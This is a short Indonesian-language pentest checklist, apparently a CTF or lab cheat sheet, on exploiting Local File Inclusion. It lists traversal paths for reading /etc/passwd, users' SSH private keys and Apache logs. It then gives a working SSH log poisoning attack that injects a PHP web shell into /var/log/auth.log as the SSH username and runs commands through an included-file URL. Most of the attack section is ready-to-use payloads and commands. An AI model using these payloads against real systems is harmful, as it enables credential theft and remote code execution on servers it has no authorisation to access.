# Local File Inclusion
- [ ] Cek `/etc/passwd` terus cek apakah pada direktori home bisa kita lihat ssh keys, contoh `/home/mrdoel/.ssh/id_rsa` 
- [ ] Cek `../../../../etc/apache2/envvars` dan cek apakah ada direktori log seperi `../../../../var/log/apache2/access.log` ini kasusnya pakai apache2, kalau nginx saya nda tau kok tanya saya. 
- [ ] Adalagi kasus LFI dimana berhubungan dengan log yang ada SMTP, cek apakah Port Email Seperti POP3, SMTP, IMAP terbuka

## SSH Log Poisoning
Jika pada saat menemukan LFI cek file `/var/log/auth.log` kalau ada info tentang SSH pada file tersebut maka kita bisa melakukan SSH Log Poisoning
```
ssh '<?php system($_GET['c']); ?>'@192.168.56.148
```
Maksud perintah diatas adalah untuk memasukkan kode `<?php system($_GET['c']); ?>` ke dalam file `/var/log/auth.log` sehingga kita bisa mengaksesnya dengan cara berikut

```
http://site.com/index.php?file=../../../../var/log/auth.log?c=ls
```